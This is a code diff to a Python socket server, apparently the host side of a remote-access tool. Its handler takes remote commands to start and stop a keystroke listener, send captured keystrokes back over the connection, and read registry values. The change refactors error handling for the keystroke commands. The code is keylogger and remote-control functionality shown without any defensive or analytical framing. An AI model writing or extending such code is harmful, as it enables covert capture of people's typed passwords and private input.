@@ -101,16 +101,33 @@ def connection_handler(connection, address):
             connection.sendall(data)
 
         elif header == 'keystroke-hook':
-            data = dumps(keystroke_detector.start_listening())
-            connection.sendall(data)
+            try:
+                keystroke_detector.start_listening()
+                ok = True
+                data = None
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
 
         elif header == 'keystroke-unhook':
-            data = dumps(keystroke_detector.end_listening())
-            connection.sendall(data)
+            try:
+                keystroke_detector.end_listening()
+                ok = True
+                data = None
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
 
         elif header == 'keystroke-get':
-            data = dumps(keystroke_detector.get_keys())
-            connection.sendall(data)
+            try:
+                ok = True
+                data = keystroke_detector.get_keys()
+            except:
+                ok = False
+                data = None
+            send(connection, ok, data)
 
         elif header == 'reg-getvalue':
             path, value_name = params
